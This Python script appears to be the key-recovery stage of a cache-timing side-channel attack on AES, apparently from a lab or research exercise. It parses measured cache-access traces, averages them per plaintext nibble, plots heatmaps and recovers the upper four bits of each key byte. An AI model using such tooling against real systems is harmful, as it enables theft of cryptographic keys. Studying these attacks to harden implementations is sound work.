import argparse
import os
from lib.parser import  parse_aes_file
from lib.utils import (
    compute_cache_line_averages,
    compute_averages_for_plaintext_group,
    averages_correction,
    extract_cache_misses,
    recover_4msb_key_for_byte
    )
from lib.heatmap_generator import generate_heatmap
from lib.const import PLAINTEXT_BYTES

pdf_out_path = "heatmaps.pdf"
input_file_path = "output.txt"
key_file_path = "key.txt"

# Helper function so main() stays simpler
# For each byte of the plaintext, calculate corrected averages for the 4 MSBs and generate heatmap to find cache misses
def recover_keymsb_for_byte(byte_index: int, all_samples, line_averages: list[float]) -> str:
    # Mean cache access values grouped by the 16 possible 4 MSBs of the current plaintext byte
    msb_averages = compute_averages_for_plaintext_group(all_samples, byte_index)
    # Apply correction to averages for the current byte
    corr_msb_averages = averages_correction(msb_averages, line_averages)
    # Generate heatmap on the corrected averages
    generate_heatmap(corr_msb_averages, byte_index)
    # Recover key
    cache_misses = extract_cache_misses(corr_msb_averages)
    return recover_4msb_key_for_byte(cache_misses, byte_index)


def main() -> None:
    # Possibility to specify the input file on the CLI, otherwise use default file path
    p = argparse.ArgumentParser(description="extract.py [<input-trace>]")
    p.add_argument("trace_file", nargs='?', help="Optional path for AES attack output file (defaults to 'output.txt')")
    args = p.parse_args()

    if args.trace_file:
        path = args.trace_file
    else:
        path = input_file_path

    if not os.path.isfile(path):
        raise FileNotFoundError(f"Trace file not found: {path}")

    print(f"Loading data from {path}...")

    # Parse the data from the file and save it in a data structure
    aes_data = parse_aes_file(path)

    print("Recovering key...")
    
    # Compute averages of all samples
    line_averages = compute_cache_line_averages(aes_data)

    # Key recovery
    recovered_key: list[str] = []
    for byte_index in range(PLAINTEXT_BYTES):
        byte_msb = recover_keymsb_for_byte(byte_index, aes_data, line_averages)
        print(f"Key for byte {byte_index}: {byte_msb}")
        recovered_key.append(byte_msb)

    # Output recovered partial key to a file key.txt
    with open(key_file_path, 'w') as key_file:
        key_file.write(str(recovered_key))


if __name__ == "__main__":
    main()
    